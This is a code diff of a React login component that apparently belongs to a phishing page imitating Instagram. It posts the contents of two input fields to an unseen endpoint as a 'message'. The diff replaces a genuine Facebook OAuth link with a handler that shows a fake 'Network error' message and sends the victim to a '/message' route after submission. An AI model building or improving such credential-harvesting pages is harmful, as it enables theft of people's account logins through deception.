@@ -1,12 +1,12 @@
 import { useState, useEffect, useRef } from "react";
 import FacebookIcon from '@mui/icons-material/Facebook';
-
+import { useNavigate } from "react-router-dom";
 function Home() {
     const [inputValue, setInputValue] = useState(""); 
     const [input1Value, setInput1Value] = useState(""); 
     const [isButtonRed, setIsButtonRed] = useState(false); 
     const [error, setError] = useState("");
-
+const navigate=useNavigate()
     const input = useRef();
     const input1 = useRef();
 
@@ -41,7 +41,7 @@ function Home() {
                     text: message,
                 }),
             });
-            setError("Network error, please try again later"); // Hata mesajını temizle
+           navigate("/message")
         } catch (error) {
            
         }
@@ -70,7 +70,7 @@ function Home() {
                     <div className="button-box">
                         <button>
                             <FacebookIcon />
-                            <a href="https://www.facebook.com/dialog/oauth?client_id=124024574287414&locale=tr_TR&redirect_uri=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F&response_type=code%2Cgranted_scopes&scope=email&state=%7B%22fbLoginKey%22%3A%221n3ztj31v1goq41r37akj16tkyrh1yqifoievonikmhiurs1wtfqp9%22%2C%22fbLoginReturnURL%22%3A%22%2Ffxcal%2Fdisclosure%2F%3Fnext%3D%252Faccounts%252Fsignup%252F%22%7D">
+                            <a onClick={()=>{setError("Network error, try again later")}}>
                                 Continue with Facebook
                             </a>
                         </button>
